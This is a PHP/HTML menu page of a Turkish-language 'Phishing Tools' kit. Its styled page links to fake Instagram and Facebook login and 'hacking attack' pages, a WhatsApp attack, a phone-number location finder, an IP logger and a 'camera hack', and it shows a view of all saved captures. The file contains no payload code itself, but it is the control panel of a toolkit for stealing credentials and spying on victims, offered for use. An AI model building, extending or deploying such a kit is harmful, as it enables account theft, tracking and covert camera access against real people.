<!DOCTYPE html>
<html translate="no">
<head>
<?php
include ("phishing_files/info-command.php");
?>
<link rel="icon" href="http://localhost:4444/phishing-tools/phishing_files/icon.png" type="image/x-icon"/>
  <title>PHİSHİNG TOOLS</title>
    
<style>
@import url('https://fonts.googleapis.com/css2?family=Kiwi+Maru:wght@300&display=swap');
@import url('https://fonts.googleapis.com/css2?family=Poppins:wght@300;400&display=swap');
* {
  margin: 0;
  padding: 0;
  font-family: 'Kiwi Maru', serif;
  text-shadow: 0px -1px 0px rgba(0,0,0,0.4);
  list-style:none;
  text-decoration: none;
}

body {
  background: #000;
  box-sizing: border-box;
}
a {
  display: block;
  font-family: 'Poppins', sans-serif;
}
.green-neon {
   text-shadow: 2px 2px 1px rgba(0,0,0,.4),
    0 0 20px #69F0AE,
    0 0 40px rgba(0, 230, 118, .75),
    0 0 50px rgba(0, 230, 118, .75),
    0 0 100px rgba(0, 230, 118, .75);
}

.green-neon:before{
  content:'';
  background: rgba(105, 240, 174, .25);
  z-index: -1;
  opacity: .7;
  filter: blur(30px);
  width: 100%;
  height: 100%;
}

.box {
position: absolute;
left: 50%;
top: 50%;
transform: translate(-50%, -50%);
background: black;
border-radius: 15px;
padding: 15px;
padding-bottom: 50px;
box-shadow: 0 0 5px #03e9f4,
     0 0 25px #03e9f4,
      0 0 50px #03e9f4 ,
       0 0 200px #03e9f4;
}

.box h1 {
font-size: 50px;
color:white;
text-align: center;
padding: 50px 50px 50px 50px;
margin-top: 40px;
}

.page a{
 color: black;

}

.pages{
  display: none;
}


.page:hover > .pages{
  display: block;
  background: black;
  position: absolute;
  margin-left: -54%;
  border-radius: 15px;
  box-shadow: 0 0 5px #7CFC00,
              0 0 15px #7CFC00,
              0 0 20px #7CFC00,
	      0 0 30px #7CFC00;

}

.page:hover{
  background: #03e9f4;
  box-shadow: 0 0 5px #03e9f4,
              0 0 25px #03e9f4,
              0 0 50px #03e9f4,
	      0 0 100px #03e9f4;
}

.page{
  display: block;
  margin:25px 50px;
  padding:10px;
  background: white;
  text-align: center;
  border-radius: 10px;
  margin-bottom: 10px;
  padding: 10px;
}

.pages li {
  padding: 25px;
}

.pages li a{
  color: lime;
  font-size: 20px;
}
.pages li a:hover{
  color: black;
  padding: 10px;
  background: #fff;
  border-radius: 10px;
  box-shadow: 0 0 5px red,
              0 0 15px red,
              0 0 20px red,
	      0 0 30px red;
}

.settings-box li{
margin-left: 50px;
display: inline-block;
}
.settings-box li a{
font-family: 'Kiwi Maru', serif;
background: black;
border-radius: 10px;
padding: 15px 10px;
color: white;
font-size: 17px;
text-align: center;
box-shadow: 0 0 5px yellow,
            0 0 15px yellow,
            0 0 20px yellow,
	    0 0 30px yellow;

}

.settings-box li a:hover{
  box-shadow: 0 0 5px cyan,
              0 0 15px cyan,
              0 0 20px cyan,
	      0 0 30px cyan;
}
.settings-box li .del{
  box-shadow: 0 0 5px #ff0000,
              0 0 15px #ff0000,
              0 0 20px #ff0000,
	      0 0 30px #ff0000;
}

</style>


</head>

<body >

<div class="box">
<ul class="settings-box">
     <li><a href='/'>ANASAYFA</a></li>
     <li><a href="?all">TÜM KAYDEDİLENLER</a></li>
</ul>

<?php
include ("phishing_files/info-box.php");
?>

<!--<div class="information"></div>-->
<h1 class="green-neon">PHİSHİNG TOOLS</h1>
<ul class="menu">

   <li class="page"><a href="instagram/instagram-pages.php">İNSTAGRAM</a>
     <!--<ul class="pages">
         <li><a href="instagram/attack/index.php">Hacking&nbsp;Attack</a></li>
         <li><a href="instagram/begeni/index.php">Beğeni&nbsp;Hilesi</a></li>
         <li><a href="instagram/fake-panel/index.php">Fake&nbsp;Panel</a></li>
     </ul>--></li>

   <li class="page"><a href="facebook/facebook-pages.php">FACEBOOK</a>
     <!--<ul class="pages">
         <li><a href="facebook/attack/index.php">Hacking&nbsp;Attack</a></li>
         <li><a href="facebook/begeni/index.php">Beğeni&nbsp;Hilesi</a></li>
         <li><a href="facebook/fake-panel/index.php">Fake&nbsp;Panel</a></li>
     </ul>--></li>

   <li class="page"><a href="whatsapp/attack/index.php">WHATSAPP</a>
     <!--<ul class="pages">
         <li><a href="whatsapp/attack/index.php">Hacking&nbsp;Attack</a></li>
     </ul>--></li>

   <li class="page"><a href="find-location/number/index.php">KONUM&nbsp;BULMA</a>
     <!--<ul class="pages">
         <li><a href="#">Başlat</a></li>
     </ul>--></li>
   <li class="page"><a href="ip-logger/interface/ip-logger.php">İP&nbsp;LOGGER</a></li>

   <li class="page"><a href="camera-hack/photoshop/index.php">CAMERA&nbsp;HACK</a>
     <!--<ul class="pages">
         <li><a href="#">Photoshop</a></li>
     </ul>--></li>
</ul>

</div>

</body>

</html>
